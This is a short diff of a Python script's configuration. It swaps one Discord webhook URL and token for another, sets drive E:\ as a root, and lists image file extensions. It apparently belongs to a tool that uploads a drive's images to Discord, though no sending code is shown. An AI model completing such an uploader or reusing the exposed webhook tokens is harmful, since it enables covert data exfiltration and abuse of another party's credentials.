@@ -1,7 +1,7 @@
 import requests
 import os
 
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1410619274720055317/-V4w7U5MKF7ggn6xFGrDZfFm4JYzdhQ0wywW7EKzzVS22a2FbCXqI6rXMtj-kjhHM54C"
+WEBHOOK_URL = "https://discordapp.com/api/webhooks/1410983770022088764/n3bcdZVzjgKbp3aAVpBI_C6EPtFUlHzKDaVU3smV0J2lDR-kDS-8RY4dHxVMqwS9sOZC"
 
 drive_root = "E:\\"
 image_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff'}
